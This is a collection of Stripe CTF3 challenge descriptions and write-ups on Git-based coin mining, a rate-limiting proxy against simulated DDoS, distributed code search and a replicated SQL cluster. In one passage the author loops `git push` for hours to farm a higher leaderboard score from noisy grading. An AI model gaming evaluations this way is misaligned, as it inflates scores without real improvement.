nelhage: 23
woodrow: 41
ludwig: 151
```

There’s a twist, however: in order to push a new commit, that commit’s SHA1 must be lexicographically less than the value contained in the repository’s `difficulty.txt` file. For instance, a commit in a Gitcoin blockchain with difficulty `00005` might look something like the following:

```diff
commit 00004216ba61aecaafb11135ee43b1674855d6ff7
Author: Alyssa P Hacker <alyssa@example.com>
Date:   Wed Jan 22 14:10:15 2014 -0800

    Give myself a Gitcoin

    nonce: tahf8buC

diff --git a/LEDGER.txt b/LEDGER.txt
index 3890681..41980b2 100644
--- a/LEDGER.txt
+++ b/LEDGER.txt
@@ -7,3 +7,4 @@ andy: 30
 carl: 12
 gdb: 45
 pa: 30
+user-hpbsuozt: 1
```

However, it wouldn’t be valid if `difficulty.txt` contained `00003` or `000001`.

The Git repository’s history thus forms a blockchain with a proof-of-work for each block, just like in Bitcoin. Of > course, unlike Bitcoin, Gitcoin just uses Git and doesn’t require a custom client.

Gitcoins are mined by adding yourself to [the `LEDGER.txt`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/LEDGER.txt) with 1 Gitcoin (or incrementing your entry if already present) in a commit with an allowable SHA1. For simplicity, the ledger is maintained centrally and never rolled back (though, there’s no inherent reason we couldn’t decentralize Gitcoin, since it’s built off of the same foundation as Bitcoin).

To beat the level (and gain 50 points), you need to mine a Gitcoin. You’ll be competing against our own mining bot swarm, so you’ll need to out-compute them. (Note that as soon as one of them mines a Gitcoin, you’ll have to throw out all your work and start your search again from the new base commit.)

You can obtain your personal Gitcoin instance here:

```bash
git clone lvl1-qfrfxagh@stripe-ctf.com:level1
```

Your public username for this level is `user-hpbsuozt`, so a winning commit must add `user-hpbsuozt: 1` to the ledger.

To get you started, we’ve included [a sample miner implementation in your Gitcoin instance](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/miner). The miner is far too slow to use in practice though.

We’ll start a new Gitcoin instance every 15 minutes in order to keep history short. You should run `git reset --hard origin/master` when this happens in order to reset your clone’s state.

## Write-up

The bottleneck in the provided [`miner` script](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/problem/miner) is the following code, found within a hot loop:

```bash
body="tree $tree
parent $parent
author CTF user <me@example.com> $timestamp +0000
committer CTF user <me@example.com> $timestamp +0000

Give me a Gitcoin

$counter"

# See http://git-scm.com/book/en/Git-Internals-Git-Objects for
# details on Git objects.
sha1=$(git hash-object -t commit --stdin <<< "$body")
```

This code generates a Git commit object and computes its hash. Because a new `git` process is launched for every commit object we want to check, this is pretty slow. The key to solving this challenge is to [re-implement Git’s object hashing](http://git-scm.com/book/en/Git-Internals-Git-Objects#Object-Storage) ourselves.

I ended up rewriting the entire `miner` script in Python — see [`miner.py`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level1/miner.py). Use it as follows:

```bash
$ ./miner.py lvl1-qfrfxagh@stripe-ctf.com:level1 user-hpbsuozt
Mining…
Mined a Gitcoin! The SHA-1 is:
00000037948a0bc8e05e3f85c3198636362c9f40
HEAD is now at 00000037 Give me a Gitcoin
To lvl1-qfrfxagh@stripe-ctf.com:level1
 ! [rejected]        master -> master (fetch first)
error: failed to push some refs to 'lvl1-qfrfxagh@stripe-ctf.com:level1'
hint: Updates were rejected because the remote contains work that you do
hint: not have locally. This is usually caused by another repository pushing
hint: to the same ref. You may want to first integrate the remote changes
hint: (e.g., 'git pull ...') before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details.
Starting over :(
Mining…
Mined a Gitcoin! The SHA-1 is:
00000068d3ff02e5a12967049697ab532ef2b19b
HEAD is now at 00000068 Give me a Gitcoin
Counting objects: 5, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 398 bytes | 0 bytes/s, done.
Total 3 (delta 1), reused 0 (delta 0)
remote: ===================
remote:
remote: Congratulations, user-hpbsuozt! You've just earned your first Gitcoin. Your leaderboard score is 50.
remote:
remote:
remote: The bots will stop now. You can run `git clone lvl1-qfrfxagh@stripe-ctf.com:current-round` to go head-to-head against other Gitcoin miners and earn more points.
remote:
remote: ===================
To lvl1-qfrfxagh@stripe-ctf.com:level1
   000000ae..00000068 master -> master
Success :)
```

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level1>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level1>
* <https://github.com/lericson/stripe-ctf3/tree/level1>
* [Solution in Haskell](https://gist.github.com/yanatan16/a4517f4804166855c58a)
* [Solution in C/CUDA](https://github.com/metcalf/ctf3/tree/master/level1)
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)

# Level 2

## Getting started

As in Level 0, you can run this level using `test/harness` and you can it
submit for scoring using `git push`. Your goal is to modify the
reverse proxy in `shield` to create a defensive proxy that mitigates
floods of malicious traffic. When you submit your `shield` for
scoring, we will run it using a copy of the network simulation code
that is available in `network_simulation/`.

To run the provide code, you will need a Node.js installation. See:

  http://nodejs.org

## Building

The provided `./build.sh` will install the level's Node.js
dependencies using the Node Package Manager (`npm`). Remember that
this build script will be run on our scoring servers to build your
submitted code, and you can modify it however you want.

## Included files

* `./shield` and `./build.sh`: You should modify these!
* `./network_simulation/`: a copy of the simulation code that we run on
  our servers. They are provided for your reference and for local
  simulations. We maintain our own copies of them for purposes of
  scoring.
** `backend.js`: the code for the fragile backend servers
** `sword.js` the code that simulates the malicious and legitimate
  traffic against the backends
* `./network_simulation/lib/`: some Node.js modules that are shared by the rest of the
  included code. Yours to modify (although you often won't need to).

## The simulation and scoring

### The layout of the simulated network

The network has three components: your proxy (`shield`), backends, and
clients. The standard configuration, used for scoring and used by
`test/harness`, is to have a backend listen on port 3001 and a second
on 3002. Then `shield` connects to the two backends and listens on
port `3000`. Then `sword.js` is run, and it simulates a swarm of many
clients (some legitimate and some malicious) connecting to the proxy.
Although there are two backends in the scoring simulation, the stub
code in `shield` does not perform any load balancing unless you modify
it to do so.

Technical note: the simulation framework uses HEAD requests to check
the upness of the `shield` and backends (it won't run until they're
up). If you are doing a major re-write, you should preserve the
current semantics around HEAD (see the `sword.js` source for more).

## The scoring

In the simulated environment, there are a large number of legitimate
clients making just a few requests each. There are also a small
number of malicious clients making an enormous number of requests
each. Think of these as mice and elephants: the goal of the level is
to let the mice through while keeping the elephants out.

The scoring simulation runs for 20 seconds. During that period, you
receive one point each time that you successfully proxy a response to
a request that was made by a mouse. At the end of the 20 seconds, you
lose points in proportion to the idleness of your backend boxes
(i.e. if you don't have an opportunity to proxy a mouse request, it is
better to proxy an elephant request than do nothing).

When the requests are coming in they are not labeled as
legitimate or malicious. However, the originating IP is
identified by the 'X-Forwarded-For' header on each packet. You can
determine, by watching the network whether an IP is malicious. A
given IP is either always malicious or always legitimate



# Stripe CTF3: level2

## Description

You get a frantic late-night call from the ops team of a major online service provider: “We’ve been hit by this massive DDOS attack,” they say. “It’s a hundred times our normal traffic and we’re dropping requests every ms. Our clients can’t get through and their trust in us is crumbling. Please, you’ve got to do something.”

The targeted company runs a fleet of fragile backend boxes that perform expensive computation on each inbound request. They’ve asked you not to muck around with those internal boxes. Instead, you need to build a defensive proxy layer to drop between the attackers and the backends. The proxy needs to blackhole the attackers while allowing legitimate users to get through.

For this level, the besieged ops team has provided [a bare-bones reverse proxy written in Node.js](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/shield). The existing proxy is just a stub, and it does nothing to separate malicious and legitimate traffic. You can expand it or write your own from scratch.

[The repo’s `README.md`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/README.md) gives helpful detail. In the repo, we’ve also included code to simulate the network environment described in our story: fragile backends and an onslaught of legitimate and malicious traffic. You can test and score your proxy inside this simulation by running `test/harness`.

## Write-up

[The provided `shield` script](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/problem/shield) contains the following code:

```js
var Queue = function (proxies, parameters) {
  this.proxies = proxies;
  this.parameters = parameters;
};
Queue.prototype.takeRequest = function (reqData) {
  // Reject traffic as necessary:
  // if (currently_blacklisted(ipFromRequest(reqData))) {
  //   rejectRequest(reqData);
  //   return;
  // }
  // Otherwise proxy it through:
  this.proxies[0].proxyRequest(reqData.request, reqData.response, reqData.buffer);
};
```

There are two parts to this challenge:

1. implement load balancing (i.e. making use of all the available proxies instead of just `proxies[0]`)
2. implement rate-limiting (i.e. blacklist IP addresses that attempt to DDoS somehow)

I’ve implemented load balancing as follows:

```diff
diff --git a/shield b/shield
index 4796d2a..1333337 100755
--- a/shield
+++ b/shield
@@ -27,6 +27,7 @@ var Queue = function (proxies, parameters) {
   this.proxies = proxies;
   this.parameters = parameters;
 };
+var proxyIndex = 0;
 Queue.prototype.takeRequest = function (reqData) {
   // Reject traffic as necessary:
   // if (currently_blacklisted(ipFromRequest(reqData))) {
@@ -34,7 +35,9 @@ Queue.prototype.takeRequest = function (reqData) {
   //   return;
   // }
   // Otherwise proxy it through:
-  this.proxies[0].proxyRequest(reqData.request, reqData.response, reqData.buffer);
+  var proxies = this.proxies;
+  proxies[proxyIndex].proxyRequest(reqData.request, reqData.response, reqData.buffer);
+  proxyIndex = (proxyIndex + 1) % proxies.length;
 };
 Queue.prototype.requestFinished = function () {
   return;
```

My rate-limiting solution was a quick and dirty one that turned out to be sufficient to pass this level:

```diff
diff --git a/shield b/shield
index 1333337..9000001 100755
--- a/shield
+++ b/shield
@@ -23,6 +23,17 @@ function rejectRequest(reqData) {
   reqData.response.end();
 }

+var hash = Object.create(null);
+var MAX_REQUESTS = 7; // the number `7` was chosen after some trial and error
+function currently_blacklisted(ip) {
+  var value = hash[ip];
+  if (value != null) {
+    hash[ip]++;
+  } else {
+    hash[ip] = 0;
+  }
+  return value >= MAX_REQUESTS;
+}
+
 var Queue = function (proxies, parameters) {
   this.proxies = proxies;
   this.parameters = parameters;
@@ -30,10 +41,10 @@ var Queue = function (proxies, parameters) {
 var proxyIndex = 0;
 Queue.prototype.takeRequest = function (reqData) {
   // Reject traffic as necessary:
-  // if (currently_blacklisted(ipFromRequest(reqData))) {
-  //   rejectRequest(reqData);
-  //   return;
-  // }
+  if (currently_blacklisted(ipFromRequest(reqData))) {
+    rejectRequest(reqData);
+    return;
+  }
   // Otherwise proxy it through:
   var proxies = this.proxies;
   proxies[proxyIndex].proxyRequest(reqData.request, reqData.response, reqData.buffer);
```

After running [the patched file](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level2/level2) through the test harness, we get output similar to:

```bash
$ ./test/harness
…
Test case passed. Your score: 181.541667. Benchmark score: 127.416667. You/Benchmark: 1.424787. You handled 247 legitimate responses and you received 65.46 negative points for idle time on the backends. The benchmark handled 222 and received 94.58 negative points.
```

Hungry for a higher score, and noticing the scores (both mine and the benchmark’s) were fluctuating heavily even for identical test runs, I just kept on re-submitting the same solution to the CTF server for a few hours:

```bash
$ while :; do git push; done
```

This netted me [a score of 251](https://stripe-ctf.com/achievements/mathias) for this level (11th place on the leaderboard!).

## Other write-ups or solutions

* <http://abiusx.com/stripe-ctf-v3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level2>
* <https://github.com/metcalf/ctf3/tree/master/level2>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level2>
* <https://github.com/lericson/stripe-ctf3/tree/level2>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)

# Level 3

## API

Instant Code Search defines the following HTTP endpoints. All of them
return JSON.

- /healthcheck:
Returns '{"success": "true"}' if all the nodes are up and ready to receive
requests.

- /index?path=PATH:
Takes a path on the filesystem and indexes it.

- /isIndexed:
Returns '{"success": "true"}' if all the nodes have indexed paths, and are
ready to receive queries.

- /?q=QUERY
Returns any file and line number in the indexed path. The response is of
this form:

    {
      "success": true,
      "results": [
        "path/to/file1:5",
        "path/to/another/file:33",
        ...
      ]
    }

All of these endpoints have been implemented, but we could use your expertise
in making the query endpoint a _lot_ faster.

## Usage

To start a specific server, run `bin/start-server`. This looks to see if
your jar is assembled; if it is, it runs the jar, and if not, uses sbt[1].

To start all of your nodes, run `bin/start-servers`. This will start a
master search node, and three search nodes. The master node is the only
node that we communicate with.

The master node runs on port 9090 (and the search nodes on 9091, 9092, and
9093). Once the servers are up, you can point your browser at
http://localhost:9090 to communicate with (and query) the master node.

As always, to submit your code, first commit, and then run `git push`.

You can test your code locally via `test/harness`[2]. You can use the
harness to download the test cases we run your code against.

Note that the input is generated randomly on a seed; we'll always run
against the same dictionary (the harness will download that dictionary for
you if you don't have it).

## Constraints

We're limiting the amount of memory that each of your nodes gets to 500mb.

When running your solution, we'll give you up to 4 minutes to index,
after which, ready or not, we'll start sending queries your way!

(We'll be polling `/isIndexed` in the meanwhile, and if at any point, you're
ready to start accepting queries, we'll start sending them.)

## Scoring

The scoring in this level is based on a single metric: the average request
latency over 50 requests. Your score is a function of the ratio of your
average response time to the default solution.

To beat the level, you will have to perform 4 times as fast as the default
solution in this repository.

Good luck!

[1] Scala Build Tool: http://www.scala-sbt.org/

# Stripe CTF3: level3

## Description

[`git grep`](https://www.kernel.org/pub/software/scm/git/docs/git-grep.html) is nice and convenient for finding code in a single repository on your current disk. [Google Code Search](http://en.wikipedia.org/wiki/Google_Code_Search), and now [GitHub Code Search](https://github.com/blog/1381-a-whole-new-code-search), have shown how great it is to be able to search across all of your code at once.

But what if you want to search across all of your on-disk code? Ideally, there’d be a tool which indexes all of it for you, allowing you to perform instant search. For very low latency (which would allow cool things like typeahead search), you might distribute that work across multiple machines.

Any guesses where this is going? :)

For this level, you’ll be building a distributed instant code search. We’ve provided [a skeleton of a code search system written in Scala](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level3/problem) for you; it’s too slow for anyone to be happy calling it instant code search though. Your job is to get queries to complete with much lower latency.

## Write-up

One solution is to implement a path-sharded in-memory scan.

(TODO)

## Other write-ups or solutions

* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level3>
* <https://github.com/metcalf/ctf3/tree/master/level3>
* <https://github.com/xthexder/stripe-ctf-3.0>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level3>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level3>
* [Solution in Node.js](https://gist.github.com/yanatan16/9694fc5cae878bbe90d8)
* [Burst trie implementation in Scala, used as part of the top-scoring solution](https://github.com/nbauernfeind/scala-burst-trie)
* [2nd place solution](https://github.com/lericson/stripe-ctf3/tree/level3)
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)

# SQLCluster

SQLCluster makes your SQLite highly-available.

## Getting started

To run this level, you'll need a working Go installation. If you don't
have one yet, it's quite easy to obtain. Just grab the appropriate
installer from:

  https://code.google.com/p/go/downloads/list

Then set your GOPATH environment variable:

  http://golang.org/doc/code.html#GOPATH

It'll probably be convenient to check this code out into
$GOPATH/src/stripe-ctf.com/sqlcluster (that way, `go build` will know
how to compile it without help). However, you can use the provided
`build.sh` regardless of where you happened to check this level out.

## Building and running

Run `./build.sh` to build the SQLCluster binary.

As always, you can run test cases via `test/harness`. This will
automatically fetch and compile Octopus, download your test cases, and
score your level for you.

Octopus will print out your score, together with how it arrived at
said score.

## Protocol

SQCluster communicates with the outside world over HTTP. The public
interface is simple:

  POST /sql:

    input:  A raw SQL body

    output: A message with the form "SequenceNumber: $n", followed
            by the output of that SQL command.

Run `./build.sh` to build SQLCluster and have it print out some
example usage (including `curl`s you can run locally).

## Supported platforms

SQLCluster has been tested on Mac OSX and Linux. It may work on other
platforms, but we make no promises. If it's not working for you, see
https://stripe-ctf.com/about#development for advice on getting a
development environment similar to our own.

# Stripe CTF3: level4

## Description

Last night, your master MySQL database fell over in the middle of the night, causing you to wake up and perform an emergency failover. In the meanwhile, your entire site was down, relying on your sleepy self to remember and run the correct sequence of commands.

This has you thinking: there's got to be a better way. You know that there are [lots](http://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf) [of](http://docs.mongodb.org/manual/replication/) [systems](http://www.datastax.com/docs/1.0/cluster_architecture/replication) [out](http://zookeeper.apache.org/doc/r3.1.2/zookeeperInternals.html) [there](https://github.com/coreos/etcd) which provide automatic failover and high-availability. Why can’t you have that for your MySQL database too?

Starting today, you can.

In this level, your goal is to build a multi-node [highly-available](http://www.firstsql.com/highavailability.html) SQL database that behaves identically to a single node, even in the presence of network or node failures.

We’ve given you [starter code for such a database](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level4/problem), written in [Go](http://golang.org/). The database uses a home-grown failover scheme, which it turns out doesn’t work very well in practice.

You’ll likely find [`README.md`](https://github.com/ctfs/write-ups/blob/master/stripe-ctf3/level4/problem/README.md) to be helpful in getting your bearings.

To actually test how your code handles failure scenarios, `test/harness` uses our network simulator, [Octopus](https://github.com/stripe-ctf/octopus), which will spin up your nodes and proxy their communication (acting as a [lossy network](http://www.dataexpedition.com/support/notes/tn0021.html)). Octopus will then start issuing SQL queries to all nodes at once, checking at each step to make sure your output looks exactly like what it gets by running the same queries locally.

## Write-up

The hard part of distributed databases really comes down to state replication — given one server that’s received a write request, how does it make sure the other servers know about that write before it’s accepted? Fortunately, there are a number of algorithms for this, such as [Paxos](http://research.microsoft.com/en-us/um/people/lamport/pubs/paxos-simple.pdf) and [Raft](https://ramcloud.stanford.edu/wiki/download/attachments/11370504/raft.pdf).

One solution would be to add [the Go implementation of the Raft distributed consensus protocol](https://github.com/goraft/raft) to [the provided starter code](https://github.com/ctfs/write-ups/tree/master/stripe-ctf3/level4/problem).

(TODO)

## Other write-ups or solutions

* [Top-scoring solution for this challenge (see “`level5`”)](https://github.com/xthexder/stripe-ctf-3.0)
* <http://tullo.ch/articles/stripe-ctf-golfing/>
* <http://muehe.org/posts/stripe-ctf-3-writeup/>
* [Gibybo’s write-up](https://news.ycombinator.com/item?id=7180991)
* [Jon Eisen’s write-up](http://blog.joneisen.me/post/75008410654)
* [Evan Priestley’s write-up](http://blog.phacility.com/post/stripe_ctf3/)
* [Samuel Walker’s write-up](http://www.samuelwalker.me.uk/2014/01/stripe-ctf3-write-up/)
* <https://github.com/henrik-muehe/level4>
* <https://github.com/metcalf/ctf3/tree/master/level4>
* <https://github.com/rrjamie/stripe-ctf-level4>
* <https://github.com/vinzenz/stripe-ctf3-solutions/tree/master/level4>
* <https://github.com/kratorius/stripe-ctf3/tree/master/level4>
* <https://github.com/lericson/stripe-ctf3/tree/level4>
* <https://github.com/yanatan16/stripe-ctf3-level4>
* [Original problems including a modified test harness that works locally](https://github.com/janosgyerik/stripe-ctf3)

# Stripe CTF3 write-ups

* <https://stripe-ctf.com/>
* <https://stripe.com/blog/ctf3-launch>
* <https://stripe.com/blog/ctf3-wrap-up>
* [Blog post on CTF3’s architecture](https://stripe.com/blog/ctf3-architecture) [(video)](https://www.youtube.com/watch?v=zktac6QKzUk&hd=1)

## Completed write-ups

* [level0](level0)
* [level1](level1)
* [level2](level2)

## Incomplete write-ups

* [level3](level3)
* [level4](level4)

